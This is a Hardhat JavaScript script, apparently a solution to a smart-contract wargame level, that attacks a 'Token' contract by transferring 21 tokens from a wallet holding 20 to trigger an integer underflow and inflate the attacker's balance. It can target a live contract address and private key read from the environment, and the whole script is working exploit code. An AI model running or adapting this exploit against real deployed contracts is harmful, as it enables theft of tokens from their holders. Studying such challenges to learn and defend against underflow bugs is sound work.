const { assert } = require("console");
const { ethers } = require("hardhat");
const hre = require("hardhat");
require("dotenv").config({ path: ".env" });

CONTRACT_NAME = "Token"

async function getContract(wallet) {
  const factory = await hre.ethers.getContractFactory(CONTRACT_NAME);
  let contract = null;
  if(hre.network.name == "hardhat") {
    contract = await factory.deploy(20);
    await contract.deployed();
    await (await contract.transfer(wallet.address, 20)).wait();
  }
  else {
    contract = factory.attach(process.env.CONTRACT_ADDRESS);
  }
  return contract.connect(wallet);
}

async function giveWalletMoney(hacker) {
  assert(hre.network.name == "hardhat");
  const [owner] = await ethers.getSigners();
  const trans = await owner.sendTransaction({
    to: hacker.address,
    value: ethers.utils.parseEther("0.1"),
  });
  await trans.wait()
}

async function main() {
  console.log("network name:", hre.network.name);
  const hacker = new ethers.Wallet(process.env.PRIVATE_KEY, hre.ethers.provider);
  contract = await getContract(hacker);
  if(hre.network.name == "hardhat") {
    console.log("getting some eth")
    giveWalletMoney(hacker);
  }

  console.log("hacking contract:", contract.address);

  const [owner] = await ethers.getSigners();
  console.log("give more tokens than we have");
  await (await contract.transfer("0xf39Fd6e51aad88F6F4ce6aB8827279cffFb92266", 21)).wait();
  console.log("hacker now has balance:", await contract.balanceOf(hacker.address));
}

// We recommend this pattern to be able to use async/await everywhere
// and properly handle errors.
main().catch((error) => {
  console.error(error);
  process.exitCode = 1;
});